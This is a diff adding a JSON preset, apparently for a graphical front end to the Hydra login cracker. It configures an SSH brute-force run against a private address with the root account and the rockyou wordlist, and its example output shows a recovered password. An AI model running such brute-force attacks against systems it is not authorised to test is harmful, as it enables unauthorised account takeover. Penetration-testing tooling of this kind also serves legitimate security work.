@@ -1,0 +1,14 @@
+[
+  {
+    "name": "Basic SSH Brute Force",
+    "description": "Brute force SSH using a known username and a password list.",
+    "options": {
+      "target_entry": "192.168.1.50",
+      "service_select": "ssh",
+      "login_entry": "root",
+      "password_list_upload": "/usr/share/wordlists/rockyou.txt",
+      "verbose_var": true
+    },
+    "example_output": "\u001b[1m\u001b[34m[INFO]\u001b[0m Hydra starting...\n\u001b[32m[22][ssh] host: 192.168.1.50   login: root   password: password123\u001b[0m"
+  }
+]
